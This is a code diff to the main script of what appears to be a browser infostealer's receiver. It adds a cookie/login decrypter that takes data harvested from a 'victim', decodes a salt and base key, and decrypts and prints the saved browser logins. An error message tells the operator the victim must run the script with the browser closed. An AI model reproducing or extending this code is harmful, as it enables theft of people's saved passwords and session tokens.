@@ -1,9 +1,10 @@
 from modules.core.Ui.AsciiArt import AsciiArt
 from modules.core.Ui.MarkdownDisplay import MarkdownComponent
 from modules.core.ReceiveData.ReceiverCredentials import ReceiverCredentials;
+from modules.core.decryptData.CookiesDecrypter import CookieesDecrypter
 
 
-import argparse, re, sys, time
+import argparse, re, sys, time, json, base64
 
 
 
@@ -64,12 +65,27 @@ def main():
             time.sleep(1)
 
 
-    if(data == 'Database is locked database is locked'): 
-        asciiR.Failure("Not ")
-
     asciiR.Success("Established connection!!");
-    print(data)
+
+    if(data["cookies"] == 'Database is locked database is locked'): 
+        asciiR.Failure("Could not get tokens, make sure the victim runs the script with the browser closed");
+
     
+
+    salt = base64.b64decode(data["decrypt"]["salt"].encode("utf-8"));
+    baseKey = base64.b64decode(data["decrypt"]["item2"].encode("utf-8"));
+    loginsData = json.loads(data["logins.json"])["logins"];
+    
+    decrypter = CookieesDecrypter(salt, baseKey, loginsData);
+
+
+    print(decrypter.DecryptLogins());
+
+    
+
+
+
+
 
 
     
